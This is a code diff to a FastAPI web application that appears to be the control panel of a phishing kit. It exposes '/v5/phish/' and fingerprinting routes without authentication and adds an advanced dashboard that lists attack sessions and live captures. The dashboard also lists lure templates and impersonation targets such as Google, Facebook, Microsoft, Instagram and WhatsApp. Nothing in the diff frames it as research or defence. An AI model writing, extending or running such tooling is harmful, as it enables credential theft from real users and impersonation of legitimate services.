@@ -40,7 +40,7 @@ def create_app() -> FastAPI:
         @app.middleware("http")
         async def tier2_auth_middleware(request: Request, call_next):
             # Allow public endpoints without auth
-            public_prefixes = ["/ui", "/ui/", "/static/", "/assets/", "/v5/r/", "/v5/js/", "/v5/sw.js", "/v5/maintenance", "/v5/verify_fingerprint", "/v5/p/", "/v5/phish/", "/v5/dashboard/"]
+            public_prefixes = ["/static/", "/assets/", "/v5/r/", "/v5/js/", "/v5/sw.js", "/v5/maintenance", "/v5/verify_fingerprint", "/v5/p/", "/v5/phish/", "/v5/dashboard/", "/v5/auth/"]
             if any(request.url.path.startswith(prefix) for prefix in public_prefixes) or request.url.path in ["/v5/health", "/health"]:
                  return await call_next(request)
             
@@ -59,6 +59,26 @@ def create_app() -> FastAPI:
     @app.get("/ui", response_class=HTMLResponse)
     async def ui_dashboard(request: Request):
         return templates.TemplateResponse("dashboard.html", {"request": request})
+
+    # Advanced Dashboard with all menu features
+    @app.get("/ui/advanced", response_class=HTMLResponse)
+    async def advanced_dashboard(request: Request):
+        """Dashboard avancé avec toutes les fonctionnalités du menu + temps réel"""
+        from core.utils.i18n import i18n
+        from core.common.metrics import get_live_metrics
+        from core.edge.session import get_attack_sessions
+        
+        return templates.TemplateResponse("advanced_dashboard.html", {
+            "request": request,
+            "metrics": get_live_metrics(),
+            "sessions": get_attack_sessions(limit=50),
+            "language": i18n.current_language,
+            "menu_options": {
+                "phishing_targets": ["google", "facebook", "microsoft", "instagram", "whatsapp"],
+                "generator_templates": ["facebook_giveaway", "instagram_contest", "google_drive", "microsoft_teams"],
+                "monitoring_features": ["live_captures", "geo_map", "os_detection", "browser_fingerprinting"]
+            }
+        })
 
     @app.get("/ui/guides", response_class=HTMLResponse)
     async def ui_guides(request: Request):
